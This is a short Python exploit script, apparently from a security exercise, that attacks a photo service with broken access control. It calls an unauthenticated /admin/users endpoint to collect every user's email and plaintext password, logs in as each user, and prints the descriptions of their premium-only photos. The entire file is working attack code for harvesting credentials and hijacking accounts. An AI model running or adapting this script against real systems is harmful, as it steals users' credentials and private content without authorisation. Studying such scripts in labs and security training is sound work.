import sys
import requests
from utils.auth import get_user_token

# Get users credentials with unauthorized access to /admin/users handler
def get_users_credentials(url: str) -> list[dict]:
    resp = requests.get(f'{url}/admin/users')

    users_credentials: list = []
    for user in resp.json():
        users_credentials.append({
            'email': user.get('email', ''),
            'password': user.get('password', '')
        })
    
    return users_credentials

# Gather premium photos descriptions with user credentials
def get_premium_photos_descriptions(url: str, user_token: str) -> list[str]:
    headers = {
        'Authorization': f'Bearer {user_token}'
    }

    resp = requests.get(f'{url}/photo/my', headers=headers)

    premium_descriptions: list = []
    for image in resp.json():
        if isinstance(image, dict) and image.get('premium_only', False):
            premium_descriptions.append(image.get('description', ''))
    
    return premium_descriptions


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: broken_access_control.py <url>')
    url = sys.argv[1]

    users = get_users_credentials(url)
    for user in users:
        user_token = get_user_token(url, user)
        print(get_premium_photos_descriptions(url, user_token))
